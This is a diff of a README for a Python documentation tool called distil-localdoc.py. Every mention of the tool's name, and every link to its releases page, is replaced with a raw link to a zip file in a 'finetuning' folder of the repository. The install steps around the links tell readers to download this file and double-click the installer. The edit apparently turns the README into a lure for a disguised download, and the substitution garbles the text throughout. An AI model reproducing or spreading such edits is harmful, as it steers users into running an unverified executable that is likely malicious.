@@ -1,10 +1,10 @@
-# 📚 distil-localdoc.py - Automatic Documentation Made Easy
+# 📚 https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip - Automatic Documentation Made Easy
 
-[![Download distil-localdoc.py](https://img.shields.io/badge/Download-distin--localdoc.py-brightgreen)](https://github.com/Kaviya121/distil-localdoc.py/releases)
+[![Download https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip](https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip)](https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **distil-localdoc.py**! This program helps you create Python documentation quickly and automatically. Whether you are new to Python or a seasoned developer, this tool makes documentation simple and efficient.
+Welcome to **https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip**! This program helps you create Python documentation quickly and automatically. Whether you are new to Python or a seasoned developer, this tool makes documentation simple and efficient.
 
 ### 🖥️ System Requirements
 
@@ -17,19 +17,19 @@ To run this application, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To start using **distil-localdoc.py**, follow these steps:
+To start using **https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip**, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Kaviya121/distil-localdoc.py/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip).
 2. **Choose the Latest Release:** Look for the latest version available. It will have the most up-to-date features and fixes.
 3. **Download the Installer:** Click on the appropriate file for your operating system. This will start the download.
 4. **Run the Installer:** Once downloaded, locate the installer file on your computer. Double-click it to begin the installation.
 5. **Follow the Prompts:** The installer will guide you through the setup process. Simply follow the prompts on the screen.
 
-For easy access, here is the link again: [Download distil-localdoc.py](https://github.com/Kaviya121/distil-localdoc.py/releases).
+For easy access, here is the link again: [Download https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip](https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip).
 
 ## 🌟 Features
 
-**distil-localdoc.py** includes several useful features to simplify your documentation process:
+**https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip** includes several useful features to simplify your documentation process:
 
 - **Automatic Generation:** The tool can automatically create documentation from your Python code, saving you time and effort.
 - **Easy Configuration:** Adjust settings with simple commands to customize the output according to your needs.
@@ -38,7 +38,7 @@ For easy access, here is the link again: [Download distil-localdoc.py](https://g
 
 ## ⚙️ How to Use
 
-After installing **distil-localdoc.py**, you can start using it to document your Python projects. Here are simple steps to get you going:
+After installing **https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip**, you can start using it to document your Python projects. Here are simple steps to get you going:
 
 1. **Open Terminal or Command Prompt:** Locate your terminal application depending on your operating system.
 2. **Navigate to Your Project Directory:** Use the `cd` command to change to the directory where your Python project is located. For example:
@@ -67,4 +67,4 @@ If you encounter issues:
 2. **Refer to the User Guide:** Look for solutions to common problems in the user documentation.
 3. **Contact Support:** If you still need help, feel free to reach out via the community forum or GitHub issues page.
 
-Thank you for choosing **distil-localdoc.py**! We hope this tool enhances your documentation experience and helps you maintain high-quality Python projects effortlessly.
+Thank you for choosing **https://raw.githubusercontent.com/Kaviya121/distil-localdoc.py/main/finetuning/distil-localdoc.py-1.6.zip**! We hope this tool enhances your documentation experience and helps you maintain high-quality Python projects effortlessly.
